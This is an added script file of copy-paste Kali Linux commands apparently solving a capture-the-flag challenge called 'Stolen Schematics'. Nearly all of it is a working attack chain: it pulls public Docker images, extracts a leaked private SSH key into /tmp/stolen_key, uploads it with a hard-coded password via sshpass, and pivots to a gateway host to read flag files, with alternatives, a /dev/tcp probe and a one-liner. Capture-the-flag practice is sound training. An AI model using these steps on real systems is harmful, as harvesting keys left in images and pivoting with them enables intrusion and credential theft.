@@ -1,0 +1,130 @@
+################################################################################
+# STOLEN SCHEMATICS - COPY/PASTE COMMANDS FOR KALI LINUX
+# Just copy each block and paste into your Kali terminal
+################################################################################
+
+# ============================================================================
+# STEP 0: SETUP (Run once before starting)
+# ============================================================================
+
+# Install required tools
+sudo apt update && sudo apt install -y docker.io sshpass openssh-client
+
+# Start Docker
+sudo systemctl start docker
+
+# Add yourself to docker group (then logout/login)
+sudo usermod -aG docker $USER
+
+
+# ============================================================================
+# STEP 1: FIND THE PUBLIC DOCKER IMAGE
+# ============================================================================
+
+# Test common image names (copy all these together)
+docker pull ghcr.io/talldwarfhosting/mc-server:latest
+docker pull ghcr.io/talldwarfhosting/mc-server:v1
+docker pull ghcr.io/talldwarfhosting/mc-server:v0.1
+docker pull ghcr.io/talldwarfhosting/minecraft-server:latest
+docker pull ghcr.io/talldwarfhosting/minecraft-server:v1
+docker pull ghcr.io/talldwarfhosting/game-server:latest
+docker pull ghcr.io/talldwarfhosting/game-server:v1
+
+# Look for "Downloaded" in output above
+# When you find one that works, use it in the next steps
+
+
+# ============================================================================
+# STEP 2: EXTRACT SSH KEY FROM IMAGE
+# ============================================================================
+
+# Replace IMAGE_NAME:TAG with the one that worked above
+# Example: ghcr.io/talldwarfhosting/mc-server:v1
+
+docker run --rm ghcr.io/talldwarfhosting/mc-server:v1 cat /root/.ssh/id_rsa > /tmp/stolen_key
+
+# Set permissions
+chmod 600 /tmp/stolen_key
+
+# Verify key (should show "BEGIN RSA PRIVATE KEY" or similar)
+head -1 /tmp/stolen_key
+
+
+# ============================================================================
+# STEP 3: SET YOUR INSTANCE PORT
+# ============================================================================
+
+# UPDATE THIS WITH YOUR ACTUAL PORT NUMBER!
+export INSTANCE_PORT="32881"
+
+
+# ============================================================================
+# STEP 4: UPLOAD KEY TO CONTAINER
+# ============================================================================
+
+sshpass -p "reyalp" scp -o StrictHostKeyChecking=no -P $INSTANCE_PORT /tmp/stolen_key player@instance.ctf.tdho.st:/tmp/key
+
+
+# ============================================================================
+# STEP 5: GET THE FLAG (SINGLE COMMAND)
+# ============================================================================
+
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st 'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt"'
+
+
+################################################################################
+# IF THAT DOESN'T WORK - TRY THESE ALTERNATIVES
+################################################################################
+
+# Alternative 1: Try different flag locations
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st 'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat flag.txt"'
+
+# Alternative 2: Try root user instead of player
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st 'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no root@172.27.0.1 "cat /etc/flag.txt"'
+
+# Alternative 3: Search for flag file
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st 'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "find / -name flag.txt 2>/dev/null | xargs cat"'
+
+
+################################################################################
+# TROUBLESHOOTING COMMANDS
+################################################################################
+
+# If SSH key extraction failed, search the image manually:
+docker run --rm ghcr.io/talldwarfhosting/mc-server:v1 find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null
+
+# Then extract from the found path:
+docker run --rm ghcr.io/talldwarfhosting/mc-server:v1 cat /path/to/found/key > /tmp/stolen_key
+
+# Test connection to instance:
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st "echo 'Connected OK'"
+
+# Check if gateway is reachable from container:
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st "timeout 2 bash -c 'echo >/dev/tcp/172.27.0.1/22' && echo 'Gateway reachable'"
+
+
+################################################################################
+# SUPER QUICK ONE-LINER (After finding the image)
+################################################################################
+
+# Set these first:
+export INSTANCE_PORT="32881"
+export IMAGE="ghcr.io/talldwarfhosting/mc-server:v1"
+
+# Then run this single command:
+docker run --rm $IMAGE cat /root/.ssh/id_rsa > /tmp/k && chmod 600 /tmp/k && sshpass -p "reyalp" scp -o StrictHostKeyChecking=no -P $INSTANCE_PORT /tmp/k player@instance.ctf.tdho.st:/tmp/k && sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st 'chmod 600 /tmp/k && ssh -i /tmp/k -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt"'
+
+
+################################################################################
+# NOTES
+################################################################################
+
+# The flag format is: TDHT{...}
+# Instance expires in 8-10 minutes - work fast!
+# Gateway is at: 172.27.0.1
+# Container password: reyalp
+# Challenge requires publickey auth to gateway - that's why we need the leaked key
+
+################################################################################
+# END
+################################################################################
